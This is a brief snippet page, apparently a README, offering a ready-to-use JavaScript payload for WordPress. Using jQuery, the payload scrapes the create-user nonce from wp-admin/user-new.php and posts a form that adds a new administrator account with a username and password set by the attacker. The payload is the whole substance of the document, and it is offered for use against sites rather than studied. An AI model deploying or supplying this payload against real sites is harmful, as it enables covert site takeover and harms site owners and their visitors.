# WordPress JS Snippets #

## Create Admin ##
Minimal-ish JS payload to grab a new user nonce and use it to create a new administrator. Configurable bits at the start (path to WordPress root, username, email address, and password for the new user).

`u='/path-to-wp-root';un='username';em='em@a.il',pw='passwurd!';nu=u+'/wp-admin/user-new.php';j=jQuery;j.get(nu,function(d){n=d.split("_wpnonce_create-user\" value=\"")[1].split("\"")[0];j.post(nu,{action:'createuser','_wpnonce_create-user':n,'_wp_http_referer':nu,'user_login':un,email:em,'first_name':'','last_name':'',url:'',pass1:pw,'pass1-text':pw,pass2:pw,'pw_weak':'on','send_user_notification':'0',role:'administrator',createuser:'Add New User'});})`
